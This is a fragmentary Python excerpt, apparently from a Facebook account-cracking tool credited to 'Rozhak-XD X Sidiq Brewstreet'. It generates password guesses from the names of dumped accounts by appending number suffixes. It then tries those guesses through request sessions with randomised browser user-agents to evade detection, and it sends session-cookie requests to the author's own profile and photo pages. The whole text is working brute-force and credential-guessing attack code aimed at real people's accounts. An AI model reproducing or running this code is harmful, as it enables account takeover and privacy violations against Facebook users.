                ...
                for z in Dump:
                    ...
                    for nama in name.split(' '):
                        if len(nama) < 3:
                            ...
                            password.append(nama + '132')
                            password.append(nama + '321')
                            password.append(nama + '111')
                            password.append(nama + '121')
                            password.append(nama + '1221')
                            password.append(nama + '121')
                            password.append(nama + '1122')
                            password.append(nama + '1212')
                            password.append(nama + '131')
                            password.append(nama + '1331')
                            password.append(nama + '1313')
                            password.append(nama + '11133')
                            password.append(nama + '112233')
                            password.append(nama + '27')
                            password.append(nama + '13')
                            password.append(nama + '25')
                        else:
                            password.append(name)
    ...
    try:
        for password in pwx:
            with requests.Session() as r:
                acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
                browser_version = (f'{random.randrange(90, 109)}.0.{random.randrange(4000, 4900)}.{random.randrange(40, 160)}')
...
\t   [underline blue]Coded by Rozhak-XD X Sidiq Brewstreet""", width=47, title="Version 2.5", style="bold white")) # Coded by Rozhak-XD
    try:
        ...
        if token.lower() == 'get' or 'get' in str(token.lower()):
            ...
            try:
                ...
                response = requests.get('https://mbasic.facebook.com/sidiq.brewstreet.1', headers = {'cookie': cookies}).text # Jangan Di Ganti
                ...
                response2 = requests.get('https://mbasic.facebook.com/photo.php?fbid=944969913088810&id=100027274295777&set=a.104163987169411', headers = {'cookie': cookies}).text # Jangan Di Ganti
                data = {
